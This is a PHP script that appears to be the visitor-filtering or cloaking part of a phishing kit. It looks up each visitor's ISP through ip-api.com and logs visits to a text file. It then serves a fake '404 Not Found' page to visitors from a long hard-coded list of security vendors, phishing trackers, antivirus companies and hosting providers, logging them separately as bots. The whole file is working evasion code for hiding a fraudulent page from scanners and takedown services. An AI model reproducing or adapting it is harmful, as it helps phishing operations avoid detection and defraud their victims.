<?php include ('rbox.php');?>
<?php
$A = $_SERVER['REMOTE_ADDR'];
$D= $_COOKIE['check'];
   if($A==$D){
header("location: $LAND");
   }
?>
<?php
$client  = @$_SERVER["HTTP_CLIENT_IP"];
$forward = @$_SERVER["HTTP_X_FORWARDED_FOR"];
$remote  = @$_SERVER["REMOTE_ADDR"];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION["_ip_"]  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION["_ip_"]  = $forward;
}
else{
    $_SESSION["_ip_"]  = $remote;
}
$IP=$_SESSION["_ip_"];
function curl_get_file_contents($URL)
    {
        $c = curl_init();
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_URL, $URL);
        $contents = curl_exec($c);
        curl_close($c);

        if ($contents) return $contents;
        else return FALSE;
    }
$DETAILS= curl_get_file_contents("http://ip-api.com/json/$IP");
$myJSON = json_decode($DETAILS);
$COUNTRYCODE =$myJSON->countryCode;
$COUNTRYNAME = $myJSON->country;
$ISP = $myJSON->isp;


$IP = getenv("REMOTE_ADDR");
         $content = "#> [".$_SERVER['HTTP_USER_AGENT']."][". $_SERVER['REMOTE_ADDR']."] [".$COUNTRYNAME."] [ISP: ".$ISP."] DateTime: ".date('l jS \of F Y h:i:s A')."\r\n";
        $save=fopen("../visit_log.txt","a+");
        fwrite($save,$content);
        fclose($save);


  $blocked_words = array(
"",
    "Cloudflare, Inc.",
    "Google LLC",
    "LookingGlass Cyber Solutions Inc.",
    "phishtank",
    "Fastly",
    "Hostinger International Limited",
    "QSC AG Datacenter NUE/MUC",
    "Namecheap",
    "Namecheap, Inc.",
    "DigitalOcean, LLC",
    "Digital Ocean",
    "ADMINUSLABS LLP",
    "GoDaddy.com, LLC",
    "AlienVault",
    "Baidu-International",
    "Blueliv",
    "NuCDN LLC",
    "HLL LLC",
    "SAKURA",
    "Infomaniak Network Management",
    "ESTsecurity-Threat Inside",
    "ESTsecurity Corp",
    "FraudScore",
    "Hetzner",
    "Hetzner Online GmbH",
    "G-Data",
    "Akamai Technologies",
    "Akamai International B.V.",
    "Limelight Networks, Inc.",
    "Telekommunikation Mittleres Ruhrgebiet GmbH",
    "K7AntiVirus",
    "K7 Total Security",
    "Microsoft Corporation",
    "Rackspace",
    "HINET",
    "Net You",
    "CyRadar",
    "Baidu (Hong Kong) Limited",
    "China Unicom Beijing Province Network",
    "NETPILOT-TN79",
    "Sucuri",
    "Georgia Institute of Technology",
    "SK Broadband Co Ltd",
    "CenturyLink Communications",
    "Internet-Pro Ltd",
    "Japan Network Information Center, Internet Initiative Japan Inc.",
    "Weebly, Inc.",
    "Telenor Norge",
    "Advania Island ehf",
    "Yandex enterprise network",
    "CONTABO",
    "Incapsula Inc",
    "GETCLOUDER-SGP",
    "Hetzner Online GmbH",
    "AVAST Software s.r.o",
    "AVAST cloud",
    "Computer Problem Solving",
    "Nucleon",
    "home.pl network",
    "org\": \"home.pl S.A.",
    "Tencent",
    "Shenzhen Tencent Computer Systems Company Limited",
    "Domain names registrar REG.RU",
    "\"Domain names registrar REG.RU\", Ltd",
    "Internap Network Services (Singapore) Pte. Limited",
    "PrivateSystems Networks",
    "Addresses CNNIC",
    "Aliyun Computing Co., LTD",
    "TBROAD",
    "Ecrime Management Strategies Inc.",
    "Liquid Web, L.L.C",
    "trabia network",
    "China Unicom Guangdong Province Network",
    "Sungard Availability Network Solutions",
    "trabia network",
    "Yandex LLC",
    "Linode, LLC",
    "OVH SAS",
    "EuroDNS S.A.",
    "Emsisoft Ltd",
    "Emsisoft",
    "Network Solutions, LLC",
    "Fortinet Inc.",
    "Chunghwa Telecom Co. Ltd.",
    "Avira Operations GmbH & Co. KG",
    "PSI-USA, Inc. dba Domain Robot",
    "LLC netBridge Services",
    "eNom, LLC",
    "EHOSTIDC",
    "Bell Canada",
    "Fortinet Technologies (Canada",
    "Amanah Tech Inc.",
    "Internap Corporation",
    "Wintek Corporation",
    "F3 Netze e.V.",
    "LSW",
    "Kaspersky Lab ZAO",
    "Kaspersky Lab AO",
    "NETPILOT",
    "NET Pilot GmbH",
    "Defense.Net",
    "Limited liability company Mail.Ru",
    "Oath Holdings Inc",
    "YouTube, LLC",
    "UK-PRIVAX",
    "Bell Canada",
    "HOSTINGER US",
    "HOSTINGER UK",
    "HOSTINGER GB",
    "Hostinger",
    "ZETTA",
    "Hostwinds LLC.",
     "PDR",
    "Limestone Networks, Inc.",
    "HostDime.com, Inc.",
    "Tucows.com Co.",
    "Cloud DNS Ltd",
    "ViaWest",
    "Fortinet SARL",
    "Oracle Corporation",
    "HETZNER",
    "Level 3 Parent, LLC",
    "Incapsula Inc",
    "Akamai Technologies, Inc.",
    "Rackspace Ltd.",
    "WorldLinx Telecommunications, Inc.",
    "DOKOM Gesellschaft fuer Telekommunikation mbH",
    "Sidera Networks LLC",
    "Internet Initiative Japan Inc.",
    "StarHub Ltd",
    "Unified Layer",
    "WEBSITEWELCOME.COM",
    "AWS EC2 (eu-west-1)",
    "BTnet",
    "Netcraft Limited",
    "netcraft",
    "Shinjiru Technology Sdn Bhd",
    "Iomart Hosting Ltd",
    "Forcepoint ThreatSeeker",
    "SoftLayer",
    "Faction",
    "Lrm-Com, Inc.",
    "ISKON INTERNET d.d. za informatiku i telekomunikacije",
    "HR control engineering",
    "Network Transit Holdings LLC",
    "BT Americas, Inc",
    "Tiscali UK Ltd",
    "GALAXYGATE, LLC",
    "Trustwave Holdings",
    "Forcepoint Cloud Ltd",
    "Linode, LLC",
    "dogado GmbH",
    "Mail.Ru LLC",
    "PE Skurykhin Mukola Volodumurovuch",
    "SURFnet bv",
    "SURFNET-IP",
    "Jisc Services Limited",
    "TATA COMMUNICATIONS (AMERICA) INC",
'ITCOM Shpk',
'HEG US','Namecheap','Namecheap, Inc.',
'CISCO-CIE-GENERAL-OSA1-EDC',
'Proxad / Free SAS',
'Forcepoint Cloud London LONA]',
'Security Firewall Ltd',
'SoftLayer Technologies Inc.',
    'Kvchosting.com LLC',
    'Netstandard Inc',
    'Vitalwerks Internet Solutions, LLC'


    );
foreach ($blocked_words as $word) {
    if ($ISP=='') {
     header('HTTP/1.0 404 Not Found');
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    exit();
    }elseif ($ISP==$word) { 
      $content = "#> ".$_SERVER['HTTP_USER_AGENT']."[". $_SERVER['REMOTE_ADDR']."] [ Banned ISP: ".$word." ] DateTime: ".date('l jS \of F Y h:i:s A')." \r\n";
            $save=fopen("../bots.txt","a+");
            fwrite($save,$content);
            fclose($save);
header('HTTP/1.0 404 Not Found');
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    exit();
 
    }else{
     
    }
     
}

?>
<?php include ('botx.php');?>